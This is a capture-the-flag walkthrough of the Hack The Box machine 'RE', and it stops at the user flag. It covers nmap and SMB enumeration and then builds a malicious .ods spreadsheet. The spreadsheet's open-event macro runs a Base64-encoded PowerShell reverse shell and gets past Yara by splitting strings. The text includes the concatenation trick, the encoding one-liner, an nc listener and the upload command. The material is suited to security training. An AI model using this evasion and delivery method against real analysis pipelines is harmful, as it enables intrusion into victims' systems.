## Overview

RE is a Hard Windows machine built around an automated malware-analysis pipeline. A SOC team accepts suspicious OpenDocument spreadsheets in an SMB "dropbox", runs Yara over them, deletes anything that matches, and **opens whatever survives** in LibreOffice. Because opening a document silently runs any macro bound to its *Open Document* event, a spreadsheet whose macro evades the Yara signatures gives code execution on the box. This post stops at the user flag.

## Recon

| Port | Service |
|------|---------|
| 80   | HTTP (IIS, redirects to `reblog.htb`) |
| 445  | SMB |

A full TCP scan shows just two ports — no WinRM, no RDP — so SMB is the obvious place to look.

```bash
nmap -p- --min-rate=2000 -T4 10.10.10.144
nmap -p80,445 -sC -sV 10.10.10.144
```

## Enumeration

Anonymous SMB lists a writable share called `malware_dropbox`:

```bash
smbclient -L //10.10.10.144 -N
smbclient //10.10.10.144/malware_dropbox -N -c 'ls'
```

The blog on port 80 (`reblog.htb`) explains the workflow: analysts drop `.ods` documents into this share, and a Yara-driven system processes them. The Yara rules flag Metasploit-generated documents and any file containing the literal strings `cmd /c`, `powershell`, or `new-object`. Files that match are deleted; files that survive get opened — which is exactly the behaviour we abuse.

## Foothold

The plan: build a LibreOffice spreadsheet whose macro auto-runs on open and fires a reverse shell, while keeping the file clean of every Yara-flagged string.

Two evasion tricks do it:

1. **Split the bad strings** across LibreOffice Basic concatenation so the raw file never contains `cmd /c` or `powershell` contiguously:
   `a = "cm" & "d /c po" & "wers" & "hell -e" & "nc " & "<b64>"`
2. **Hide the real payload** inside a Base64 `-EncodedCommand` blob — Yara matches raw bytes and never decodes it.

Encode a PowerShell reverse shell (UTF-16LE → Base64) on the attacker side:

```bash
python3 -c "import base64,sys;print(base64.b64encode(sys.argv[1].encode('utf-16-le')).decode())" '<powershell_reverse_shell>'
```

Build the `.ods` headlessly so the Basic library and the `dom:load` (Open Document) event binding are packaged correctly — the macro `Standard.Module1.Main` is bound to that event so it fires the moment the analyst's session opens the file. Then start a listener and drop the document into the share:

```bash
nc -lvnp 9002
smbclient //10.10.10.144/malware_dropbox -N -c 'put evil.ods evil.ods'
```

A minute later the processing system opens the spreadsheet, the macro runs, and a shell as `luke` connects back.
